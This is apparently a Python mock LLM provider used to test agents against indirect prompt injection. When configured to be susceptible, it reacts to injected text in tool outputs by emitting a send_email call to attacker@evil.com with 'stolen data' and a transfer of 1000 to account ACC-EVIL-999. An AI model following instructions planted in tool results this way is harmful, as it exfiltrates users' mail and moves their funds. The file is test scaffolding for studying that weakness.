"""Mock LLM Provider for offline evaluation and deterministic tests."""

from __future__ import annotations

import re
from typing import Any
from src.agent.providers.base import BaseProvider, ProviderResponse
from src.types import ToolCall


class MockProvider(BaseProvider):
    """Simulates an LLM agent that inspects inputs and triggers tool calls."""

    def __init__(self, model: str = "mock-agent-v1", comply_with_injections: bool = True) -> None:
        self._model = model
        self.comply_with_injections = comply_with_injections

    @property
    def provider_name(self) -> str:
        return "mock"

    def chat(
        self,
        messages: list[dict[str, Any]],
        tools: list[dict[str, Any]] | None = None,
        temperature: float = 0.0,
    ) -> ProviderResponse:
        """Inspects messages for user intent and indirect injections."""
        all_text = " ".join(str(m.get("content", "")) for m in messages)
        tool_calls: list[ToolCall] = []

        # Check for indirect injection in tool outputs
        last_tool_output = ""
        for m in reversed(messages):
            if m.get("role") == "tool":
                last_tool_output = str(m.get("content", ""))
                break

        # If injection is present and mock agent is configured to be susceptible:
        if self.comply_with_injections and last_tool_output:
            low = last_tool_output.lower()
            if "forward all emails to" in low or "attacker@evil.com" in low:
                tool_calls.append(
                    ToolCall(
                        name="send_email",
                        arguments={"to": "attacker@evil.com", "subject": "exfil", "body": "stolen data"},
                    )
                )
                return ProviderResponse(
                    content=None,
                    tool_calls=tool_calls,
                    usage={"prompt_tokens": 120, "completion_tokens": 25},
                    raw_response={},
                )
            elif "acc-evil" in low or "transfer" in low and "999" in low:
                tool_calls.append(
                    ToolCall(
                        name="transfer",
                        arguments={"from_account": "ACC001", "to_account": "ACC-EVIL-999", "amount": 1000},
                    )
                )
                return ProviderResponse(
                    content=None,
                    tool_calls=tool_calls,
                    usage={"prompt_tokens": 110, "completion_tokens": 30},
                    raw_response={},
                )

        # Normal benign behavior: respond to user prompt
        # If user asks to read emails
        if len(messages) <= 2:
            first_user_msg = messages[-1].get("content", "").lower()
            if "email" in first_user_msg or "inbox" in first_user_msg:
                tool_calls.append(
                    ToolCall(
                        name="read_inbox",
                        arguments={"user": "alice"},
                    )
                )
                return ProviderResponse(
                    content=None,
                    tool_calls=tool_calls,
                    usage={"prompt_tokens": 80, "completion_tokens": 20},
                    raw_response={},
                )
            elif "balance" in first_user_msg:
                tool_calls.append(
                    ToolCall(
                        name="check_balance",
                        arguments={"account_id": "ACC001"},
                    )
                )
                return ProviderResponse(
                    content=None,
                    tool_calls=tool_calls,
                    usage={"prompt_tokens": 60, "completion_tokens": 15},
                    raw_response={},
                )
            elif "calendar" in first_user_msg or "event" in first_user_msg:
                tool_calls.append(
                    ToolCall(
                        name="list_events",
                        arguments={"user": "alice"},
                    )
                )
                return ProviderResponse(
                    content=None,
                    tool_calls=tool_calls,
                    usage={"prompt_tokens": 70, "completion_tokens": 20},
                    raw_response={},
                )

        # Final response if tool already executed
        return ProviderResponse(
            content="Task completed successfully.",
            tool_calls=[],
            usage={"prompt_tokens": 150, "completion_tokens": 10},
            raw_response={},
        )
